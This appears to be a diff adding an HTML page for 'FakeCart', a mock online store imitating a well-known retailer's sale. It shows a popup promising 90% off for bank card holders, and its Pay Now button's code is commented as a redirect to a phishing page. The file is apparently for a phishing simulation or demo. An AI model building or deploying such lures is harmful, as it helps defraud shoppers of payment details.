@@ -1,0 +1,676 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FakeCart - Online Shopping Site</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Arial', sans-serif;
+        }
+        
+        body {
+            background-color: #f1f3f6;
+        }
+        
+        /* Header Styles */
+        header {
+            background-color: #2874f0;
+            color: white;
+            padding: 10px 0;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            box-shadow: 0 1px 5px rgba(0,0,0,0.2);
+        }
+        
+        .header-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+        }
+        
+        .logo img {
+            height: 24px;
+            margin-right: 10px;
+        }
+        
+        .logo h1 {
+            font-size: 22px;
+            font-weight: 600;
+            font-style: italic;
+            color: white;
+        }
+        
+        .search-bar {
+            display: flex;
+            width: 50%;
+        }
+        
+        .search-bar input {
+            width: 100%;
+            padding: 10px 15px;
+            border: none;
+            outline: none;
+            font-size: 14px;
+        }
+        
+        .search-bar button {
+            background-color: white;
+            border: none;
+            padding: 0 20px;
+            cursor: pointer;
+            color: #2874f0;
+            font-weight: 600;
+        }
+        
+        .nav-links {
+            display: flex;
+            align-items: center;
+        }
+        
+        .nav-links a {
+            color: white;
+            text-decoration: none;
+            margin-left: 25px;
+            font-size: 16px;
+            font-weight: 500;
+        }
+        
+        .nav-links a:hover {
+            text-decoration: underline;
+        }
+        
+        .login-btn {
+            background-color: white;
+            color: #2874f0;
+            padding: 7px 30px;
+            border-radius: 2px;
+            font-weight: 600;
+        }
+        
+        /* Popup Modal */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 200;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.7);
+        }
+        
+        .modal-content {
+            background-color: #fff;
+            margin: 10% auto;
+            padding: 30px;
+            width: 400px;
+            border-radius: 8px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+            position: relative;
+            text-align: center;
+        }
+        
+        .close-btn {
+            position: absolute;
+            right: 15px;
+            top: 15px;
+            font-size: 24px;
+            font-weight: bold;
+            cursor: pointer;
+            color: #888;
+        }
+        
+        .close-btn:hover {
+            color: #000;
+        }
+        
+        .offer-badge {
+            background-color: #ff6161;
+            color: white;
+            padding: 5px 10px;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: bold;
+            display: inline-block;
+            margin-bottom: 15px;
+        }
+        
+        .bank-logo {
+            width: 100px;
+            height: 50px;
+            object-fit: contain;
+            margin: 10px 0;
+        }
+        
+        .offer-text {
+            font-size: 24px;
+            font-weight: bold;
+            margin: 15px 0;
+            color: #2874f0;
+        }
+        
+        .offer-details {
+            font-size: 16px;
+            color: #666;
+            margin-bottom: 20px;
+        }
+        
+        /* Main Content */
+        .main-container {
+            max-width: 1200px;
+            margin: 20px auto;
+            padding: 0 20px;
+        }
+        
+        .banner {
+            width: 100%;
+            height: 200px;
+            background-color: #2874f0;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 24px;
+            background-image: linear-gradient(to right, #2874f0, #1a5bb9);
+        }
+        
+        .products-section {
+            background-color: white;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
+        
+        .section-title {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 20px;
+            color: #212121;
+        }
+        
+        .products-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 20px;
+        }
+        
+        .product-card {
+            border: 1px solid #e0e0e0;
+            border-radius: 5px;
+            padding: 15px;
+            cursor: pointer;
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+        
+        .product-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+        }
+        
+        .product-image {
+            width: 100%;
+            height: 150px;
+            object-fit: contain;
+            margin-bottom: 15px;
+        }
+        
+        .product-title {
+            font-size: 14px;
+            color: #212121;
+            margin-bottom: 10px;
+            height: 40px;
+            overflow: hidden;
+        }
+        
+        .product-price {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+        
+        .current-price {
+            font-size: 16px;
+            font-weight: 600;
+            color: #212121;
+        }
+        
+        .original-price {
+            font-size: 14px;
+            color: #878787;
+            text-decoration: line-through;
+            margin-left: 8px;
+        }
+        
+        .discount {
+            color: #388e3c;
+            font-size: 13px;
+            margin-left: 8px;
+        }
+        
+        .add-to-cart {
+            width: 100%;
+            padding: 8px 0;
+            background-color: #ff9f00;
+            color: white;
+            border: none;
+            border-radius: 2px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        
+        .add-to-cart:hover {
+            background-color: #ff8300;
+        }
+        
+        /* Cart Section */
+        .cart-container {
+            display: none;
+            background-color: white;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+            margin-top: 20px;
+        }
+        
+        .cart-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 0;
+            border-bottom: 1px solid #e0e0e0;
+        }
+        
+        .cart-item:last-child {
+            border-bottom: none;
+        }
+        
+        .cart-item-info {
+            display: flex;
+            align-items: center;
+        }
+        
+        .cart-item-image {
+            width: 60px;
+            height: 60px;
+            object-fit: contain;
+            margin-right: 15px;
+        }
+        
+        .cart-item-title {
+            font-size: 14px;
+            color: #212121;
+        }
+        
+        .cart-item-price {
+            font-size: 16px;
+            font-weight: 600;
+            color: #212121;
+        }
+        
+        .cart-summary {
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 1px dashed #e0e0e0;
+            text-align: right;
+        }
+        
+        .total-amount {
+            font-size: 18px;
+            font-weight: 600;
+            color: #212121;
+        }
+        
+        .pay-now-btn {
+            background-color: #fb641b;
+            color: white;
+            border: none;
+            padding: 10px 30px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 2px;
+            cursor: pointer;
+            margin-top: 15px;
+        }
+        
+        .pay-now-btn:hover {
+            background-color: #e55b17;
+        }
+        
+        /* Footer */
+        footer {
+            background-color: #172337;
+            color: white;
+            padding: 30px 0;
+            margin-top: 40px;
+        }
+        
+        .footer-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 30px;
+        }
+        
+        .footer-column h3 {
+            font-size: 14px;
+            color: #878787;
+            margin-bottom: 15px;
+            text-transform: uppercase;
+        }
+        
+        .footer-column ul {
+            list-style: none;
+        }
+        
+        .footer-column ul li {
+            margin-bottom: 10px;
+        }
+        
+        .footer-column ul li a {
+            color: white;
+            text-decoration: none;
+            font-size: 12px;
+        }
+        
+        .footer-column ul li a:hover {
+            text-decoration: underline;
+        }
+        
+        .copyright {
+            text-align: center;
+            padding-top: 20px;
+            margin-top: 20px;
+            border-top: 1px solid #454d5e;
+            font-size: 12px;
+            color: #878787;
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <header>
+        <div class="header-container">
+            <div class="logo">
+                
+                <h1>FakeCart</h1>
+            </div>
+            <div class="search-bar">
+                <input type="text" placeholder="Search for products, brands and more">
+                <button>Search</button>
+            </div>
+            <div class="nav-links">
+                <a href="#">Become a Seller</a>
+                <a href="#">More</a>
+                <a href="#">Cart</a>
+                <a href="#" class="login-btn">Login</a>
+            </div>
+        </div>
+    </header>
+    
+    <!-- Popup Modal -->
+    <div id="offerModal" class="modal">
+        <div class="modal-content">
+            <span class="close-btn">&times;</span>
+            <div class="offer-badge">EXCLUSIVE OFFER</div>
+            
+            <div class="offer-text">90% OFF for Fake Bank Customers!</div>
+            <div class="offer-details">
+                Get flat 90% discount on your first purchase with your bank debit/credit card. Limited time offer!
+            </div>
+            <button class="add-to-cart" style="background-color: #2874f0;">Shop Now</button>
+        </div>
+    </div>
+    
+    <!-- Main Content -->
+    <div class="main-container">
+        <div class="banner">
+            Big Billion Days Sale - Up to 90% Off
+        </div>
+        
+        <div class="products-section">
+            <h2 class="section-title">Deals of the Day</h2>
+            <div class="products-grid">
+                <div class="product-card" data-price="15999">
+                    <img src="https://encrypted-tbn2.gstatic.com/shopping?q=tbn:ANd9GcRcOdsNUwLpcP1UvN2Sv7vwk2KJh1A-iEFem9GAKh-FojWdsgdROl5sUzrYZ8q-UtmcMBY5PueEgiTkVV7cIyNb6jVOZEqNH86bJ5F5d9FuQ4ebd0Qbfjwasw" alt="Product" class="product-image">
+                    <div class="product-title">Samsung Galaxy S21 FE 5G (Graphite, 128 GB)</div>
+                    <div class="product-price">
+                        <span class="current-price">₹15,999</span>
+                        <span class="original-price">₹54,999</span>
+                        <span class="discount">70% off</span>
+                    </div>
+                    <button class="add-to-cart">Add to Cart</button>
+                </div>
+                
+                <div class="product-card" data-price="12999">
+                    <img src="https://encrypted-tbn0.gstatic.com/shopping?q=tbn:ANd9GcSODjpHjhxxRz50_uUCAn8fdd3n_G_Q2ydGnQfKjjd-qOtn5U17Eg8_obxU__pjnzwnolAWbGre7bG5TbKx-NxWIC_yJIGCcw" alt="Product" class="product-image">
+                    <div class="product-title">OnePlus Nord CE 3 Lite 5G (Pastel Lime, 128 GB)</div>
+                    <div class="product-price">
+                        <span class="current-price">₹12,999</span>
+                        <span class="original-price">₹19,999</span>
+                        <span class="discount">35% off</span>
+                    </div>
+                    <button class="add-to-cart">Add to Cart</button>
+                </div>
+                
+                <div class="product-card" data-price="59999">
+                    <img src="https://encrypted-tbn3.gstatic.com/shopping?q=tbn:ANd9GcRr29Z2ebfCTIrs7XuIBBCPLhJHfFtFUY6Nrd7bVnwWU6bxyZlgdw26O1KTtuPTMtombP87w3xJb_OrmgCa0LzcjX9kBDv15UB-c73Fr0ekEr_IFL4pk7Z3mw" alt="Product" class="product-image">
+                    <div class="product-title">HP Victus AMD Ryzen 5 Hexa Core 5600H</div>
+                    <div class="product-price">
+                        <span class="current-price">₹59,999</span>
+                        <span class="original-price">₹79,999</span>
+                        <span class="discount">25% off</span>
+                    </div>
+                    <button class="add-to-cart">Add to Cart</button>
+                </div>
+                
+                <div class="product-card" data-price="34999">
+                    <img src="https://encrypted-tbn0.gstatic.com/shopping?q=tbn:ANd9GcS5vg-n0G4wx8e6CtMTpKhklr2rCPut0EpUXw3CFFLNwqpCbpHOMX4khsDq6ckUfiM7TMKwLlRMwnDm2BKyVapfUh_kH-9o" alt="Product" class="product-image">
+                    <div class="product-title">PHILIPS 108 cm (43 inch) Ultra HD (4K) LED Smart TV</div>
+                    <div class="product-price">
+                        <span class="current-price">₹34,999</span>
+                        <span class="original-price">₹49,999</span>
+                        <span class="discount">30% off</span>
+                    </div>
+                    <button class="add-to-cart">Add to Cart</button>
+                </div>
+                
+                <div class="product-card" data-price="1499">
+                    <img src="https://encrypted-tbn1.gstatic.com/shopping?q=tbn:ANd9GcQrr0UrbPSf8iybKKVWbF4CV07zHXTAE6dyXkmDNn6xbRZSyzSS0LYwdvFNEILvXGJ-E7nAkMeSut636lWdZ22tn87UqTlDNauwwtzUM3Bgfev_NNsuAjNWyg" alt="Product" class="product-image">
+                    <div class="product-title">BRUTON Trendy Sports Running Shoes For Men</div>
+                    <div class="product-price">
+                        <span class="current-price">₹1,499</span>
+                        <span class="original-price">₹2,999</span>
+                        <span class="discount">50% off</span>
+                    </div>
+                    <button class="add-to-cart">Add to Cart</button>
+                </div>
+                
+                <div class="product-card" data-price="999">
+                    <img src="https://encrypted-tbn3.gstatic.com/shopping?q=tbn:ANd9GcS3iLKoUEzwF2eXJdGBGLZqa9hgPDFRcZrBaajQn1snf_kO8_YCsGreL-gCwbuWGsqvnHwkMD7UpJxLxDyFdhi-NoyZlkxLMc57dld8KLh9VD2woPb2GNLLkA" alt="Product" class="product-image">
+                    <div class="product-title">Men Printed Round Neck Pure Cotton T-Shirt</div>
+                    <div class="product-price">
+                        <span class="current-price">₹999</span>
+                        <span class="original-price">₹1,999</span>
+                        <span class="discount">50% off</span>
+                    </div>
+                    <button class="add-to-cart">Add to Cart</button>
+                </div>
+                
+                <div class="product-card" data-price="1499">
+                    <img src="https://cdn.shopify.com/s/files/1/0057/8938/4802/files/boAt-Rockerz-235-Pro.jpg?v=1682579854" alt="Product" class="product-image">
+                    <div class="product-title">boAt Rockerz 255 Pro+ Bluetooth Headset</div>
+                    <div class="product-price">
+                        <span class="current-price">₹1,499</span>
+                        <span class="original-price">₹2,990</span>
+                        <span class="discount">49% off</span>
+                    </div>
+                    <button class="add-to-cart">Add to Cart</button>
+                </div>
+                
+                <div class="product-card" data-price="2999">
+                    <img src="https://www.gonoise.com/cdn/shop/products/PulseGrand05.png?v=1668073401" alt="Product" class="product-image">
+                    <div class="product-title">Noise ColorFit Pulse Grand Smart Watch</div>
+                    <div class="product-price">
+                        <span class="current-price">₹2,999</span>
+                        <span class="original-price">₹4,999</span>
+                        <span class="discount">40% off</span>
+                    </div>
+                    <button class="add-to-cart">Add to Cart</button>
+                </div>
+            </div>
+        </div>
+        
+        <div class="cart-container" id="cartContainer">
+            <h2 class="section-title">Your Cart</h2>
+            <div id="cartItems"></div>
+            <div class="cart-summary">
+                <div class="total-amount">Total: ₹<span id="totalAmount">0</span></div>
+                <button class="pay-now-btn" id="payNowBtn">PAY NOW</button>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Footer -->
+    <footer>
+        <div class="footer-container">
+            <div class="footer-column">
+                <h3>About</h3>
+                <ul>
+                    <li><a href="#">Contact Us</a></li>
+                    <li><a href="#">About Us</a></li>
+                    <li><a href="#">Careers</a></li>
+                    <li><a href="#">FakeCart Stories</a></li>
+                </ul>
+            </div>
+            <div class="footer-column">
+                <h3>Help</h3>
+                <ul>
+                    <li><a href="#">Payments</a></li>
+                    <li><a href="#">Shipping</a></li>
+                    <li><a href="#">Cancellation & Returns</a></li>
+                    <li><a href="#">FAQ</a></li>
+                </ul>
+            </div>
+            <div class="footer-column">
+                <h3>Policy</h3>
+                <ul>
+                    <li><a href="#">Return Policy</a></li>
+                    <li><a href="#">Terms Of Use</a></li>
+                    <li><a href="#">Security</a></li>
+                    <li><a href="#">Privacy</a></li>
+                </ul>
+            </div>
+            <div class="footer-column">
+                <h3>Social</h3>
+                <ul>
+                    <li><a href="#">Facebook</a></li>
+                    <li><a href="#">Twitter</a></li>
+                    <li><a href="#">YouTube</a></li>
+                    <li><a href="#">Instagram</a></li>
+                </ul>
+            </div>
+        </div>
+        <div class="copyright">
+            © 2023 FakeCart.com. All Rights Reserved.
+        </div>
+    </footer>
+    
+    <script>
+        // Show modal on page load
+        window.onload = function() {
+            setTimeout(function() {
+                document.getElementById('offerModal').style.display = 'block';
+            }, 1000);
+        };
+        
+        // Close modal when clicking X
+        document.querySelector('.close-btn').addEventListener('click', function() {
+            document.getElementById('offerModal').style.display = 'none';
+        });
+        
+        // Close modal when clicking outside
+        window.addEventListener('click', function(event) {
+            if (event.target == document.getElementById('offerModal')) {
+                document.getElementById('offerModal').style.display = 'none';
+            }
+        });
+        
+        // Cart functionality
+        let cart = [];
+        
+        document.querySelectorAll('.add-to-cart').forEach(button => {
+            button.addEventListener('click', function() {
+                const productCard = this.closest('.product-card');
+                const productTitle = productCard.querySelector('.product-title').textContent;
+                const productPrice = parseFloat(productCard.dataset.price);
+                const productImage = productCard.querySelector('.product-image').src;
+                
+                // Add to cart
+                cart.push({
+                    title: productTitle,
+                    price: productPrice,
+                    image: productImage
+                });
+                
+                updateCart();
+                
+                // Show cart if hidden
+                document.getElementById('cartContainer').style.display = 'block';
+            });
+        });
+        
+        function updateCart() {
+            const cartItemsContainer = document.getElementById('cartItems');
+            const totalAmountElement = document.getElementById('totalAmount');
+            
+            // Clear previous items
+            cartItemsContainer.innerHTML = '';
+            
+            // Add current items
+            let total = 0;
+            cart.forEach(item => {
+                total += item.price;
+                
+                const cartItemElement = document.createElement('div');
+                cartItemElement.className = 'cart-item';
+                cartItemElement.innerHTML = `
+                    <div class="cart-item-info">
+                        <img src="${item.image}" alt="${item.title}" class="cart-item-image">
+                        <div class="cart-item-title">${item.title}</div>
+                    </div>
+                    <div class="cart-item-price">₹${item.price.toLocaleString()}</div>
+                `;
+                
+                cartItemsContainer.appendChild(cartItemElement);
+            });
+            
+            // Update total
+            totalAmountElement.textContent = total.toLocaleString();
+        }
+        
+        // Pay Now button functionality
+        document.getElementById('payNowBtn').addEventListener('click', function() {
+            // Redirect to phishing page
+            window.location.href = 'index.html';
+        });
+    </script>
+</body>
+</html>
